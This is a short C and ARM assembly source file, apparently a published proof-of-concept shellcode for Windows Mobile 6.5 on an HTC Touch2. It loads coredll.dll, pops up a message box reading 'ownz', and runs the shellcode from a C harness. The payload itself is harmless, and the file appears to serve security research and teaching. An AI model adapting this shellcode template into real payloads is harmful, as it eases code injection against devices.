/*

Device: HTC Touch2
System: Windows Mobile 6.5 TR (WinCE 5.0.2)

Addresses of functions can be different on different devices so , you can edit the functions addresses.

Coded by Celil Ünüver from SecurityArchitect

Contact:
	celilunuver[n*spam]gmail.com
	www.securityarchitect.org
	blog.securityarchitect.org

		EXPORT	start
		AREA	.text, CODE
start
		eor	r0, r0, r0
		eor	r1, r1, r1
		eor	r2, r2, r2
		eor	r3, r3, r3
		ldr	R12, =0x3f6272c ; LoadLibrary Address
		adr	r0, lib ; library name {coredll.dll}
		mov	lr, pc
		mov	pc, r12
		ldr	r12, =0x3f7c15c ; MessageBox Address
		mov	r0, #0
		adr	r1, mes
		adr	r2, mes
		mov	R3, #0
		mov	lr, pc
		mov	pc, r12

lib		dcb	"c",0,"o",0,"r",0,"e",0,"d",0,"l",0,"l",0,".",0,"d",0,"l",0,"l",0,0,0
mes		dcb	"o",0,"w",0,"n",0,"z",0,0,0
		ALIGN
		END
*/

#include <stdio.h>
#include <windows.h>

int shellcode[] =
{
0xE0200000,
0xE0211001,
0xE0222002,
0xE0233003,
0xE59FC048,
0xE28F0020,
0xE1A0E00F,
0xE1A0F00C,
0xE59FC03C,
0xE3A00000,
0xE28F1024,
0xE28F2020,
0xE3A03000,
0xE1A0E00F,
0xE1A0F00C,
0x006F0063,
0x00650072,
0x006C0064,
0x002E006C,
0x006C0064,
0x0000006C,
0x0077006F,
0x007A006E,
0x00000000,
0x03F6272C,
0x03F7C15C,
};

int WINAPI WinMain( HINSTANCE hInstance,
                    HINSTANCE hPrevInstance,
                    LPTSTR    lpCmdLine,
                    int       nCmdShow)
{
    ((void (*)(void)) & shellcode)();

    return 0;
}